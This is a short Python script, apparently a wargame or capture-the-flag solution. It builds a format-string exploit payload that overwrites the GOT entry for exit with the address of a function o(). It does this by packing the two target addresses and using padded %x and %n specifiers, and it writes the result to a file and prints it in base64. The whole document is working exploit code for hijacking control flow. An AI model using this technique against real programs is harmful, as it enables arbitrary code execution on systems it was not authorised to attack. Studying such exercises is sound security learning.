import struct
from base64 import b64encode

exit_got_addr = 0x8049838

# address of o() -> 0x80484a4
# 2 lower bytes: 0x84a4 == 33 956
# 2 upper bytes: 0x0804 == 2052
# 0x010804 == 67 588
# 67 588 - 33 956 = 33 632

payload = b""
payload += struct.pack("I", exit_got_addr)
payload += struct.pack("I", exit_got_addr+2)
payload += b"%33948x"  # 33 956 - 8 = 33 948
payload += b"%4$n"
payload += b"%33632x"
payload += b"%5$n"

print(b64encode(payload).decode())

with open("payload", "wb") as f:
    f.write(payload)